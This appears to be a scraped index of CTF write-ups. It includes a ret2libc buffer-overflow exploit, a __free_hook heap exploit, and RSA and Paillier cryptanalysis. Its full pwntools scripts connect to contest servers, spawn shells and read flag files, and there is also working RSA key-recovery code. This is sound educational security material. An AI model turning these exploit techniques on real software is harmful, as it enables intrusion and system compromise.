Overflow the buffer, overwrite the return address with the address of our pop rdi; ret; gadget, \"/bin/sh\" string, and system address in libc and we have a shell! However, there's one problem: we're given the printf address after we write to a buffer. This printf address does not stay the same, as we can see: This interrupts our original attack plan. Overflowing the buffer and overwriting the return address with our exploit, which includes the system address from libc, requires knowing the base address of the libc to begin with in order to be calculated. This is where the binary having PIE disabled will help us. Because PIE is disabled, the program is loaded into the same memory address each time it is run. Thus, the address of main is predictable. $ objdump -d -M intel ./ret2the-unknown | grep \"<main>:\" Great! main has the address 0x401186 . If we were to overflow the buffer and overwrite the return address with main 's address, then the program will repeat itself. With this slight adjustment, our attack plan is complete: 0: Get the offset of a pop rdi; ret; gadget in the given static libc file. 1: Use a buffer overflow to overwrite the return address of main with the address of main . This will cause the main function to repeat itself once more. 2: The main function will give us the address of the loaded printf function from libc. 3: main will repeat itself thanks to our overflow from part 1. 4: Calculate the libc base address using the address of the loaded printf function from part 2. This is equal to the given loaded printf address minus the printf offset from the static libc file. 5: Use the libc base address to calculate the real address of the pop rdi; ret; gadget using its offset from part 0. 6: Use the calculated libc base address to calculate the real address of a \"/bin/sh\" string in the libc. 7: Use the libc base address to calculate the real address of the system function in libc. 8: Use a buffer overflow to overwrite the return address of main with <addr_gadget><addr_binsh><addr_system> . 9: Get a shell! Starting off with part 0, you can easily find gadgets using a tool like ropper . Now we know that there's a pop rdi; ret; at 0x023a5f . Note that this was found in the given static libc file, meaning that it hasn't been loaded yet. This is why it's so important to calculate the base address of the loaded libc in the program. 0x023a5f here is essentially the offset of the gadget, so to find the address of the same gadget in the running program, we just add it to the loaded libc's base address. The entire exploit can be easily scripted in Python with pwntools. Part 1 would look something like the following. Note that we need 32 bytes plus an additional 8 bytes to get to the return address. You can find out how many bytes you need to write to a buffer to get to the return address by overflowing with a pattern and seeing what address it will try to return to in a debugger like gdb : exploit = b\"A\" * (32+8) exploit += p64(0x401186) Remember that 0x401186 was just the address of main that we discovered earlier. This code creates an exploit consisting of 32+8 bytes of padding plus the address of main , effectively making main return to main and therefore running itself one more time. Part 2 can be read by parsing the data returned by the program. Based on the input, I got something like the following to extract the given hexadecimal address from the program: printf_addr = p.recvuntil(\"luck!\").decode(\"utf-8\").split(\"\\n\")[0] printf_addr = int(printf_addr, 16) The program will automatically repeat itself as planned in part 3. We can now calculate the libc base address using printf_addr from part 2. In fact, we can actually declare the base address in pwntools itself so that all future searches and lookups will use this base address: libc = ELF(\"./libc-2.28.so\") libc.address = printf_addr - libc.symbols[\"printf\"] What this code will do is it will load the libc file, take the printf_addr the program gave us, and subtract the offset of prinf from the libc file from it, therefore giving us the base address of the loaded libc. Part 4 complete! Therefore, the pop rdi; ret; gadget is located at this base address plus 0x023a5f . We can search through the libc for \"/bin/sh\" and system with pwntools now that we've declared its base address. We of course need to remember our padding as well to slide over to the return address. Parts 5-8, done: exploit = b\"B\" * (32+8) exploit += p64(libc.address + POP_RDI_RET) exploit += p64(next(libc.search(b\"/bin/sh\"))) exploit += p64(libc.symbols[\"system\"]) Our final exploit code will look something like the following: #!/usr/bin/env python3 from pwn import * # Gadget offsets. POP_RDI_RET = 0x00023a5f # pop rdi; ret; # Remote switch. REMOTE = True def main(): # Load the files. vuln = ELF(\"./ret2the-unknown\") libc = ELF(\"./libc-2.28.so\") # Connect to the target. if REMOTE: p = remote(\"mc.ax\", 31568) else: p = process(\"./ret2the-unknown\", env={\"LD_PRELOAD\": \"./libc-2.28.so\"}) # Overwrite ret. addr. with main's addr. exploit = b\"A\" * (32+8) # Padding to get to ret. exploit += p64(0x401186) # main() address overwrites ret. log.info(\"Overwriting return address with main.\") p.recvuntil(\"safely?\") p.sendline(exploit) # main should repeat and give us printf addr. p.recvuntil(\"there: \") printf_addr = p.recvuntil(\"luck!\").decode(\"utf-8\").split(\"\\n\")[0] # Calculate the offsets and addresses. printf_addr = int(printf_addr, 16) # Load the printf address. libc.address = printf_addr - libc.symbols[\"printf\"] # Calculate and set the libc address. # Create the exploit that overwrites ret. addr. with shellcode. exploit = b\"B\" * (32+8) # Padding to get to ret. exploit += p64(libc.address + POP_RDI_RET) # Gadget: pop rdi; ret; exploit += p64(next(libc.search(b\"/bin/sh\"))) # Pass /bin/sh. exploit += p64(libc.symbols[\"system\"]) # Call system(). # Send the exploit. log.info(\"Delivering exploit.\") p.recvuntil(\"safely?\") p.sendline(exploit) # Interact with the shell. log.info(\"Spawning shell.\") p.recvuntil(\"luck!\") p.interactive() if __name__ == \"__main__\": main() Launch the exploit and sure enough, we have a shell: It's a textbook ret2libc attack.","title":"Solution"},{"location":"Writeup/Binary%20Exploitation/ret2the-unknown/#reference","text":"Writeup from https://irissec.xyz/articles/categories/binex/2021-07-18/Executing-a-Textbook-ret2libc-Attack-to-Pop-a-Shell","title":"Reference"},{"location":"Writeup/Binary%20Exploitation/simultaneity/","text":"simultaneity Category: Binary Exploitation Source: redpwn CTF 2021 Author: asphyxia Score: 15 Description Just an instant remains before the world comes to an end... nc mc.ax 31547 Downloads libc.so.6 ld-linux-x86-64.so.2 simultaneity Analysis Checksec Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled All mitigations in place sans canary, perhaps a BOF challenge. Decompile with Ghidra The program will allocate a user defined chuck of RAM, request an offset, and then write 8 bytes to that offset. void main(void) { long in_FS_OFFSET; size_t local_20; void *local_18; undefined8 local_10; local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28); setvbuf(stdout,(char *)0x0,2,0); puts(\"how big?\"); __isoc99_scanf(&%ld,&local_20); local_18 = malloc(local_20); printf(\"you are here: %p\\n\",local_18); puts(\"how far?\"); __isoc99_scanf(&%ld,&local_20); puts(\"what?\"); __isoc99_scanf(&%zu,(void *)((long)local_18 + local_20 * 8)); _exit(0); } That _exit(0) at the end basically takes care of any potential stack-based buffer overflow (the compiler new this, so no need for the canary). The malloc return isn't being checked for NULL, so using a NULL pointer + the how far? ; you have an 8-byte write-what-where , but where to write? Need a leak. malloc , with a large size, but not so large to fail and return a NULL pointer, will allocate a chuck that is aligned with base of libc. This will provide a leak for the what? arbitrary 8-byte write. The natural target is anything ending in _hook . We get one 8-byte write ( what? ) courteous of scanf , and that same scanf needs to trigger the hook. With only 8-bytes, one_gadget is the natural choice. scanf and printf will call malloc/free with large inputs or output, e.g. with printf a %65536c format-string will trigger malloc , the analog for scanf in this challenge is to pad our what? with a lot of zeros. scanf will then call malloc , process our input, and write out our hook, then call free ; naturally we'll use __free_hook . Exploit #!/usr/bin/env python3 from pwn import * binary = context.binary = ELF('./simultaneity') if args.REMOTE: p = remote('mc.ax', 31547) libc = ELF('./libc.so.6') libc.symbols['gadget'] = [0x4484f,0x448a3,0xe5456][1] else: p = process(binary.path) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') p.sendlineafter('big?\\n','10000000') p.recvuntil('here: ') libc.address = int(p.recvline().strip(),16) + 10002416 log.info('libc.address: ' + hex(libc.address)) log.info('libc.sym.__free_hook: ' + hex(libc.sym.__free_hook)) p.sendlineafter('far?\\n',str((libc.sym.__free_hook - libc.address + 10002416) // 8)) p.sendlineafter('what?\\n',65536*'0' + str(libc.sym.gadget)) p.interactive() To get the gadgets just run one_gadget ./libc.so.6 and test each of them. The 10002416 was just measured in gdb. The big? 10000000 was lifted from another writeup xfactor sent to me. Output: # ./exploit.py REMOTE=1 [*] '/pwd/datajerk/redpwnctf2021/pwn/simultaneity/simultaneity' Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled [+] Opening connection to mc.ax on port 31547: Done [*] '/pwd/datajerk/redpwnctf2021/pwn/simultaneity/libc.so.6' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [*] libc.address: 0x7fe75f3dc000 [*] libc.sym.__free_hook: 0x7fe75f5998e8 [*] Switching to interactive mode $ id uid=1000 gid=1000 groups=1000 $ cat flag.txt flag{sc4nf_i3_4_h34p_ch4l13ng3_TKRs8b1DRlN1hoLJ} Reference Writeup from https://github.com/datajerk/ctf-write-ups/tree/master/redpwnctf2021/simultaneity","title":"simultaneity"},{"location":"Writeup/Binary%20Exploitation/simultaneity/#simultaneity","text":"Category: Binary Exploitation Source: redpwn CTF 2021 Author: asphyxia Score: 15","title":"simultaneity"},{"location":"Writeup/Binary%20Exploitation/simultaneity/#description","text":"Just an instant remains before the world comes to an end... nc mc.ax 31547","title":"Description"},{"location":"Writeup/Binary%20Exploitation/simultaneity/#downloads","text":"libc.so.6 ld-linux-x86-64.so.2 simultaneity","title":"Downloads"},{"location":"Writeup/Binary%20Exploitation/simultaneity/#analysis","text":"","title":"Analysis"},{"location":"Writeup/Binary%20Exploitation/simultaneity/#checksec","text":"Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled All mitigations in place sans canary, perhaps a BOF challenge.","title":"Checksec"},{"location":"Writeup/Binary%20Exploitation/simultaneity/#decompile-with-ghidra","text":"The program will allocate a user defined chuck of RAM, request an offset, and then write 8 bytes to that offset. void main(void) { long in_FS_OFFSET; size_t local_20; void *local_18; undefined8 local_10; local_10 = *(undefined8 *)(in_FS_OFFSET + 0x28); setvbuf(stdout,(char *)0x0,2,0); puts(\"how big?\"); __isoc99_scanf(&%ld,&local_20); local_18 = malloc(local_20); printf(\"you are here: %p\\n\",local_18); puts(\"how far?\"); __isoc99_scanf(&%ld,&local_20); puts(\"what?\"); __isoc99_scanf(&%zu,(void *)((long)local_18 + local_20 * 8)); _exit(0); } That _exit(0) at the end basically takes care of any potential stack-based buffer overflow (the compiler new this, so no need for the canary). The malloc return isn't being checked for NULL, so using a NULL pointer + the how far? ; you have an 8-byte write-what-where , but where to write? Need a leak. malloc , with a large size, but not so large to fail and return a NULL pointer, will allocate a chuck that is aligned with base of libc. This will provide a leak for the what? arbitrary 8-byte write. The natural target is anything ending in _hook . We get one 8-byte write ( what? ) courteous of scanf , and that same scanf needs to trigger the hook. With only 8-bytes, one_gadget is the natural choice. scanf and printf will call malloc/free with large inputs or output, e.g. with printf a %65536c format-string will trigger malloc , the analog for scanf in this challenge is to pad our what? with a lot of zeros. scanf will then call malloc , process our input, and write out our hook, then call free ; naturally we'll use __free_hook .","title":"Decompile with Ghidra"},{"location":"Writeup/Binary%20Exploitation/simultaneity/#exploit","text":"#!/usr/bin/env python3 from pwn import * binary = context.binary = ELF('./simultaneity') if args.REMOTE: p = remote('mc.ax', 31547) libc = ELF('./libc.so.6') libc.symbols['gadget'] = [0x4484f,0x448a3,0xe5456][1] else: p = process(binary.path) libc = ELF('/lib/x86_64-linux-gnu/libc.so.6') p.sendlineafter('big?\\n','10000000') p.recvuntil('here: ') libc.address = int(p.recvline().strip(),16) + 10002416 log.info('libc.address: ' + hex(libc.address)) log.info('libc.sym.__free_hook: ' + hex(libc.sym.__free_hook)) p.sendlineafter('far?\\n',str((libc.sym.__free_hook - libc.address + 10002416) // 8)) p.sendlineafter('what?\\n',65536*'0' + str(libc.sym.gadget)) p.interactive() To get the gadgets just run one_gadget ./libc.so.6 and test each of them. The 10002416 was just measured in gdb. The big? 10000000 was lifted from another writeup xfactor sent to me. Output: # ./exploit.py REMOTE=1 [*] '/pwd/datajerk/redpwnctf2021/pwn/simultaneity/simultaneity' Arch: amd64-64-little RELRO: Full RELRO Stack: No canary found NX: NX enabled PIE: PIE enabled [+] Opening connection to mc.ax on port 31547: Done [*] '/pwd/datajerk/redpwnctf2021/pwn/simultaneity/libc.so.6' Arch: amd64-64-little RELRO: Partial RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled [*] libc.address: 0x7fe75f3dc000 [*] libc.sym.__free_hook: 0x7fe75f5998e8 [*] Switching to interactive mode $ id uid=1000 gid=1000 groups=1000 $ cat flag.txt flag{sc4nf_i3_4_h34p_ch4l13ng3_TKRs8b1DRlN1hoLJ}","title":"Exploit"},{"location":"Writeup/Binary%20Exploitation/simultaneity/#reference","text":"Writeup from https://github.com/datajerk/ctf-write-ups/tree/master/redpwnctf2021/simultaneity","title":"Reference"},{"location":"Writeup/Cryptography/Dachshund%20Attacks/","text":"Dachshund Attacks Category: Cryptography Source: picoCTF 2021 Author: SARA Score: 10 Description What if d is too small? Connect with nc mercury.picoctf.net 58978 . Hints What do you think about my pet? dachshund.jpg Solution Connecting to nc mercury.picoctf.net 36463 in the webshell, it gives us the values of e, n and c. Give it like 10 seconds for it to return these values. As you could probably tell, it's encrypted using RSA. Now, the picture in the hint refers to Dachshund dogs. Searching up \"dachshund\" on Google, it returns a lot of results, but we're mostly looking for different names for dachshund dogs. Thus, searching up \"different names for dachshund dogs\" it gives some relevant pages one of them being this wonderful Wikipedia page. Dachshund Dogs By searching up \"Wiener RSA\", we see that it's an attack method used on RSA, especially when \"d\" is too small (it says it in the challenge description!). Wiener's Attack There's an already designed and availible Python3 implementation of Wiener attack which can be found here: Weiner Attack Python3 Implementation Run the command in shell, and it should install the implementation. From here, we need to find \"d\" using the Wiener attack method. Thus, I decided to write a small program to solve for \"d\" basing it off of the example given in the website. import owiener c = 51729254814612320597643328450085959536599727372680938760771949307679773005615308695648114596258975136775968889388756216401496118257971113771919925769604554578645725822883285841825381936016630539284003180253228150727414300152034618534378132051795168049160397854013369582290350212981743918731826059625571659195 e = 26708677238429428374170262208931535733743911260604248499407092969454401069520229604707421630650361943655516583033522359546446670546154254638564481680864845797555129549483370241281955795119447253220108830835178572671949509316867647933241089013588496517578768012481040939437738400995777121296915356470885241301 n = 102050270322368919270668432655276557677924971440195120212230040263372875358539516722287129116966588442412373177849929844163493405962383401732877189240511737479294203917101072408029656805628085793609392233931279848866908950627490592662932946058562223278970874388262808195065269805169207346022676107536878090839 d = owiener.attack(e, n) if d is None: print(\"Failed\") else : print(\"Hacked d = {}\".format(d)) As you can see, the values for c, e and n are included already, and it uses the command owiener.attack(e,n) to solve for \"d\". If there is a d value, it will print the value. By adding the following line: M = pow(c, d, n) print(\"Decrypted message: \", M) By using the built-in python command pow, it allows it to decrypt the message giving the following: 198614235373674103788888306985643587194108045477674049828366797219789354877 Converting this number to to hex, we get the following (feel free to find an online converter to speed up the process): 7069636F4354467B70726F76696E675F7769656E65725F323633353435377D Now converting the hexadecimal to plaintext we get the flag. Flag picoCTF{proving_wiener_2635457} Reference Writeup from https://github.com/vivian-dai/PicoCTF2021-Writeup/blob/main/Cryptography/Dachshund%20Attacks/dachshundattacks.md","title":"Dachshund Attacks"},{"location":"Writeup/Cryptography/Dachshund%20Attacks/#dachshund-attacks","text":"Category: Cryptography Source: picoCTF 2021 Author: SARA Score: 10","title":"Dachshund Attacks"},{"location":"Writeup/Cryptography/Dachshund%20Attacks/#description","text":"What if d is too small? Connect with nc mercury.picoctf.net 58978 .","title":"Description"},{"location":"Writeup/Cryptography/Dachshund%20Attacks/#hints","text":"What do you think about my pet? dachshund.jpg","title":"Hints"},{"location":"Writeup/Cryptography/Dachshund%20Attacks/#solution","text":"Connecting to nc mercury.picoctf.net 36463 in the webshell, it gives us the values of e, n and c. Give it like 10 seconds for it to return these values. As you could probably tell, it's encrypted using RSA. Now, the picture in the hint refers to Dachshund dogs. Searching up \"dachshund\" on Google, it returns a lot of results, but we're mostly looking for different names for dachshund dogs. Thus, searching up \"different names for dachshund dogs\" it gives some relevant pages one of them being this wonderful Wikipedia page. Dachshund Dogs By searching up \"Wiener RSA\", we see that it's an attack method used on RSA, especially when \"d\" is too small (it says it in the challenge description!). Wiener's Attack There's an already designed and availible Python3 implementation of Wiener attack which can be found here: Weiner Attack Python3 Implementation Run the command in shell, and it should install the implementation. From here, we need to find \"d\" using the Wiener attack method. Thus, I decided to write a small program to solve for \"d\" basing it off of the example given in the website. import owiener c = 51729254814612320597643328450085959536599727372680938760771949307679773005615308695648114596258975136775968889388756216401496118257971113771919925769604554578645725822883285841825381936016630539284003180253228150727414300152034618534378132051795168049160397854013369582290350212981743918731826059625571659195 e = 26708677238429428374170262208931535733743911260604248499407092969454401069520229604707421630650361943655516583033522359546446670546154254638564481680864845797555129549483370241281955795119447253220108830835178572671949509316867647933241089013588496517578768012481040939437738400995777121296915356470885241301 n = 102050270322368919270668432655276557677924971440195120212230040263372875358539516722287129116966588442412373177849929844163493405962383401732877189240511737479294203917101072408029656805628085793609392233931279848866908950627490592662932946058562223278970874388262808195065269805169207346022676107536878090839 d = owiener.attack(e, n) if d is None: print(\"Failed\") else : print(\"Hacked d = {}\".format(d)) As you can see, the values for c, e and n are included already, and it uses the command owiener.attack(e,n) to solve for \"d\". If there is a d value, it will print the value. By adding the following line: M = pow(c, d, n) print(\"Decrypted message: \", M) By using the built-in python command pow, it allows it to decrypt the message giving the following: 198614235373674103788888306985643587194108045477674049828366797219789354877 Converting this number to to hex, we get the following (feel free to find an online converter to speed up the process): 7069636F4354467B70726F76696E675F7769656E65725F323633353435377D Now converting the hexadecimal to plaintext we get the flag.","title":"Solution"},{"location":"Writeup/Cryptography/Dachshund%20Attacks/#flag","text":"picoCTF{proving_wiener_2635457}","title":"Flag"},{"location":"Writeup/Cryptography/Dachshund%20Attacks/#reference","text":"Writeup from https://github.com/vivian-dai/PicoCTF2021-Writeup/blob/main/Cryptography/Dachshund%20Attacks/dachshundattacks.md","title":"Reference"},{"location":"Writeup/Cryptography/Exposure/","text":"Exposure Category: Cryptography Source: \u7965\u4e91\u676f2020 Author: unknown Score: 50 Description Do you know how to rsa? Solution from Crypto.Util.number import * import gmpy2 p = getStrongPrime(512) q = getStrongPrime(512) n = p * q phi = (p - 1) * (q - 1) e = 7621 d = gmpy2.invert(e, phi) flag = b\"flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}\" c = pow(bytes_to_long(flag), e, n) dp = d % (p - 1) print(dp >> 200) print(c, e, n) #1153696846823715458342658568392537778171840014923745253759529432977932183322553944430236879985 #46735962204857190520476434898881001530665718155698898882603422023484998388668858692912250418134186095459060506275961050676051693220280588047233628259880712415593039977585805890920089318643002597837000049626154900908543384761210358835843974072960080857150727010985827690190496793207012355214605393036388807616 #7621 #140376049134934822153964243403031201922239588054133319056483413311963385321279682186354948441840374124640187894619689719746347334298621083485494086361152915457458004998419817456902929318697902819798254427945343361548635794308362823239150919240307072688623000747781103375481834571274423004856276841225675241863 dp\u6cc4\u9732\uff0c\u4f46\u662fdp\u88ab\u53f3\u79fb\u4e86200\u4f4d\uff0c\u60f3\u5230\u4e86Coppersmith\u653b\u51fb\uff0c\u8fd9\u4e2a\u662fdp\u9ad8\u4f4d\u6cc4\u9732\uff0c\u6240\u4ee5\u5e94\u8be5\u662f\u6c42((dp*e-1)/i)+1 \u7684 small roots \u5c31\u53ef\u4ee5\u4e86 \u53c2\u8003KAPO2019 crypto\u7684\u9898 https://github.com/pcw109550/write-up/tree/master/2019/KAPO/Lenstra-Lenstra-Lovasz \u5199\u51fa\u89e3\u5bc6sage\u811a\u672c n = 140376049134934822153964243403031201922239588054133319056483413311963385321279682186354948441840374124640187894619689719746347334298621083485494086361152915457458004998419817456902929318697902819798254427945343361548635794308362823239150919240307072688623000747781103375481834571274423004856276841225675241863 secret = 1153696846823715458342658568392537778171840014923745253759529432977932183322553944430236879985 ct = 46735962204857190520476434898881001530665718155698898882603422023484998388668858692912250418134186095459060506275961050676051693220280588047233628259880712415593039977585805890920089318643002597837000049626154900908543384761210358835843974072960080857150727010985827690190496793207012355214605393036388807616 [n, secret, ct] = list(map(Integer, [n, secret, ct])) e = 7621 def facorize(e, dp): for i in range(2, e): p = (e * dp - 1 + i) // i if n % p == 0: return p return -1 def recover(secret): F.<x> = PolynomialRing(Zmod(n)) einv = inverse_mod(e, n) for k in range(1, e): print(\"k =\", k) f = (secret << 200) + x + (k - 1) * einv x0 = f.small_roots(X=2 ** (200 + 1), beta=0.44, epsilon=1/32) if len(x0) != 0: dp = x0[0] + (secret << 200) p_cand = facorize(e, Integer(dp)) if p_cand < 0: continue else: return p_cand, dp if __name__ == \"__main__\": p, dp = recover(secret) q = n // p assert p * q == n phi = (p - 1) * (q - 1) d = inverse_mod(e, phi) print(\"p = \", p, \"\\nq = \", q) flag = bytes.fromhex(hex(pow(ct, d, n))[2:]) print(flag) Flag flag{45879a9e-1431-4c34-86e2-6f1f7bb1256d} Reference Writeup from https://mp.weixin.qq.com/s/0b9nQRxkbu7mDPji_Y8Ghw","title":"Exposure"},{"location":"Writeup/Cryptography/Exposure/#exposure","text":"Category: Cryptography Source: \u7965\u4e91\u676f2020 Author: unknown Score: 50","title":"Exposure"},{"location":"Writeup/Cryptography/Exposure/#description","text":"Do you know how to rsa?","title":"Description"},{"location":"Writeup/Cryptography/Exposure/#solution","text":"from Crypto.Util.number import * import gmpy2 p = getStrongPrime(512) q = getStrongPrime(512) n = p * q phi = (p - 1) * (q - 1) e = 7621 d = gmpy2.invert(e, phi) flag = b\"flag{xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx}\" c = pow(bytes_to_long(flag), e, n) dp = d % (p - 1) print(dp >> 200) print(c, e, n) #1153696846823715458342658568392537778171840014923745253759529432977932183322553944430236879985 #46735962204857190520476434898881001530665718155698898882603422023484998388668858692912250418134186095459060506275961050676051693220280588047233628259880712415593039977585805890920089318643002597837000049626154900908543384761210358835843974072960080857150727010985827690190496793207012355214605393036388807616 #7621 #140376049134934822153964243403031201922239588054133319056483413311963385321279682186354948441840374124640187894619689719746347334298621083485494086361152915457458004998419817456902929318697902819798254427945343361548635794308362823239150919240307072688623000747781103375481834571274423004856276841225675241863 dp\u6cc4\u9732\uff0c\u4f46\u662fdp\u88ab\u53f3\u79fb\u4e86200\u4f4d\uff0c\u60f3\u5230\u4e86Coppersmith\u653b\u51fb\uff0c\u8fd9\u4e2a\u662fdp\u9ad8\u4f4d\u6cc4\u9732\uff0c\u6240\u4ee5\u5e94\u8be5\u662f\u6c42((dp*e-1)/i)+1 \u7684 small roots \u5c31\u53ef\u4ee5\u4e86 \u53c2\u8003KAPO2019 crypto\u7684\u9898 https://github.com/pcw109550/write-up/tree/master/2019/KAPO/Lenstra-Lenstra-Lovasz \u5199\u51fa\u89e3\u5bc6sage\u811a\u672c n = 140376049134934822153964243403031201922239588054133319056483413311963385321279682186354948441840374124640187894619689719746347334298621083485494086361152915457458004998419817456902929318697902819798254427945343361548635794308362823239150919240307072688623000747781103375481834571274423004856276841225675241863 secret = 1153696846823715458342658568392537778171840014923745253759529432977932183322553944430236879985 ct = 46735962204857190520476434898881001530665718155698898882603422023484998388668858692912250418134186095459060506275961050676051693220280588047233628259880712415593039977585805890920089318643002597837000049626154900908543384761210358835843974072960080857150727010985827690190496793207012355214605393036388807616 [n, secret, ct] = list(map(Integer, [n, secret, ct])) e = 7621 def facorize(e, dp): for i in range(2, e): p = (e * dp - 1 + i) // i if n % p == 0: return p return -1 def recover(secret): F.<x> = PolynomialRing(Zmod(n)) einv = inverse_mod(e, n) for k in range(1, e): print(\"k =\", k) f = (secret << 200) + x + (k - 1) * einv x0 = f.small_roots(X=2 ** (200 + 1), beta=0.44, epsilon=1/32) if len(x0) != 0: dp = x0[0] + (secret << 200) p_cand = facorize(e, Integer(dp)) if p_cand < 0: continue else: return p_cand, dp if __name__ == \"__main__\": p, dp = recover(secret) q = n // p assert p * q == n phi = (p - 1) * (q - 1) d = inverse_mod(e, phi) print(\"p = \", p, \"\\nq = \", q) flag = bytes.fromhex(hex(pow(ct, d, n))[2:]) print(flag)","title":"Solution"},{"location":"Writeup/Cryptography/Exposure/#flag","text":"flag{45879a9e-1431-4c34-86e2-6f1f7bb1256d}","title":"Flag"},{"location":"Writeup/Cryptography/Exposure/#reference","text":"Writeup from https://mp.weixin.qq.com/s/0b9nQRxkbu7mDPji_Y8Ghw","title":"Reference"},{"location":"Writeup/Cryptography/Guess/","text":"Guess Category: Cryptography Source: \u7965\u4e91\u676f2021 Author: unknown Score: 15 Description \u5728\u4e00\u6b21\u4efb\u52a1\u4e2d\u6211\u9047\u5230\u4e86\u4e00\u4e2achallenge\uff0c\u6211\u7684\u961f\u53cb\u7ed9\u6211\u53d1\u4e86\u4e00\u4e2a\u4ed6\u622a\u83b7\u7684hint\uff0c\u4f60\u5229\u7528\u8fd9\u4e2ahint\u80fd\u5e2e\u6211\u5b8c\u6210\u8fd9\u4e2achallenge\u5417\uff1f nc 0.cloud.chals.io 14337 guess.zip \u9898\u76ee\u63cf\u8ff0 \u9996\u5148\u5b83\u6709\u4e00\u4e2a\u5bc6\u94a5\u751f\u6210\u7684\u4ee3\u7801\u3002 key \u662f\u4e00\u4e2a20*4\u7684\u77e9\u9635\uff0c\u5143\u7d20\u5747\u4e3a\u4e09\u4f4d\u6570\uff0c\u7136\u540e\u53f3\u4e58\u4e00\u4e2a\u968f\u673a1024\u4f4d\u77e9\u9635 \u5f97\u5230 \u3002\u6211\u4eec\u53ea\u77e5\u9053 key \u77e9\u9635\u7b2c\u4e00\u884c\u7684\u5185\u5bb9\uff0c\u4ee5\u53ca \u7684\u503c\uff0c\u4f46\u662f\u4e0d\u77e5\u9053 \u77e9\u9635\u7684\u5185\u5bb9\u3002 \u731c\u6d4b\u53ef\u80fd\u53ef\u4ee5\u7528\u683c\u57fa\u89c4\u7ea6\u5148\u5f04\u51fa key \uff0c\u4f46\u662f\u6709\u611f\u89c9\u4e0d\u9760\u8c31\uff0c\u6211\u4eec\u5148\u653e\u4e00\u653e\uff0c\u5ba1\u8ba1\u4e00\u4e0boracle\u4ea4\u4e92\u7684 Guess.py \u6587\u4ef6\u3002 \u6587\u4ef6\u4e2d\u4f7f\u7528\u7684\u5bc6\u7801\u7b97\u6cd5\u662fPaillier\u7b97\u6cd5\uff0c\u8be5\u7b97\u6cd5\u652f\u6301\u540c\u6001\u52a0\u6cd5\u3002oracle\u4ea4\u4e92\u903b\u8f91\u5982\u4e0b\uff1a \u7ed9\u51fa\u7b97\u6cd5\u7684\u52a0\u5bc6\u5bc6\u94a5\uff08\u5373\u516c\u94a5\uff09\u3002 \u7ed9\u51fa\u4e00\u4e2a\u5bc6\u6587\uff0coracle\u8fd4\u56de\u660e\u6587\u3002 \u7ed9\u51fa\u4e24\u4e2a\u660e\u6587 , oracle\u8fd4\u56de \u6216\u8005 \u7684\u5176\u4e2d\u4e00\u9879\uff0c\u5176\u4e2d \u662f\u4e00\u968f\u673a\u7684\u5076\u6570\uff0c \u662f\u90a380\u4e2a100-1000\u7684\u6570\u6784\u6210\u7684\u4e00\u4e2a\u5217\u8868\u3002 \u7ed9\u51fa\u4e00\u4e2a\u4e0d\u80fd\u548c\u7b2c3\u6b65\u89e3\u5bc6\u7ed3\u679c\u76f8\u540c\u7684\u5bc6\u6587\uff0coracle\u8fd4\u56de\u660e\u6587\u3002 \u5224\u65ad\u7b2c3\u6b65\u4e2doracle\u8fd4\u56de\u4e86\u54ea\u4e2a\u5bc6\u6587\uff0c\u5e76\u544a\u8bc9oracle\u7ed3\u679c\u4ee5\u68c0\u9a8c\u3002\u5982\u679coracle\u68c0\u9a8c\u6210\u529f\uff0c\u5219\u8fdb\u884c\u4e0b\u4e00\u8f6e\uff1b\u5982\u679coracle\u68c0\u9a8c\u5931\u8d25\uff0c\u5219\u7ec8\u6b62\u8fde\u63a5\u3002 \u9700\u8981\u68c0\u9a8c\u6210\u529f32\u8f6e\u624d\u80fd\u62ff\u5230flag\u3002 \u6211\u7684\u89e3\u7b54 \u672c\u8d28\u4e0a\u53ea\u9700\u8981\u628a key \u6062\u590d\u51fa\u6765\u5373\u53ef\u3002\u4f46\u662f\u6211\u4eec\u53ef\u4ee5\u5728\u4e0a\u9762\u7684\u7b2c\u56db\u6b65\u505a\u6587\u7ae0\u3002 \u7b2c\u56db\u6b65\u53ef\u4ee5\u7528Paillier\u7b97\u6cd5\u7684\u6027\u8d28\u6765\u6784\u9020\u5bc6\u6587\u3002\u8bb0 \uff0cPaillier\u7b97\u6cd5\u5bf9\u4e8e\u4e00\u4e2a\u660e\u6587 \uff0c\u5148\u968f\u673a\u751f\u6210\u4e00\u4e2a \uff0c\u7136\u540e\u8ba1\u7b97 \u3002 \u90a3\u4e48\uff0c\u5982\u679c\u6211\u4eec\u5df2\u7ecf\u77e5\u9053\u4e24\u4e2a\u660e\u6587\u5bc6\u6587\u5bf9 \uff0c\u6211\u4eec\u8ba1\u7b97 \u6b64\u65f6\u6211\u4eec\u4f1a\u53d1\u73b0\u8fd9\u4e2a\u65b0\u6784\u9020\u7684\u5bc6\u6587 \u5bf9\u5e94\u660e\u6587 \u3002 \u56e0\u6b64\uff0c\u6211\u4eec\u53ef\u4ee5\u4ee4 \u4e3aoracle\u6240\u7ed9\u7684\u5bc6\u6587\uff0c\u5e76\u4f7f\u7528\u9898\u76ee\u6240\u7ed9\u7684\u516c\u94a5\u5f97\u5230\u53e6\u4e00\u4e2a\u660e\u6587\u5bc6\u6587\u5bf9 \uff0c\u8b6c\u5982\u4ee4 \uff0c\u7136\u540e\u7528 \u548c \u52a0\u5bc6\u5f97\u5230 \uff0c\u5e76\u6784\u9020\u5bc6\u6587 \u7136\u540e\u5c31\u53ef\u4ee5\u5728oracle\u7684\u7b2c\u56db\u6b65\u8f93\u5165\u8fd9\u4e2a \uff0c\u8fd9\u6837oracle\u6240\u89e3\u51fa\u7684\u660e\u6587 \u5c31\u662f \u56e0\u4e3a\u9898\u76ee\u6240\u7ed9\u7684 key \u662f\u56fa\u5b9a\u7684\uff0c\u4e5f\u5c31\u662f\u8bf4 \u662f\u56fa\u5b9a\u7684\uff0c\u6240\u4ee5oracle\u89e3\u51fa\u7684\u660e\u6587 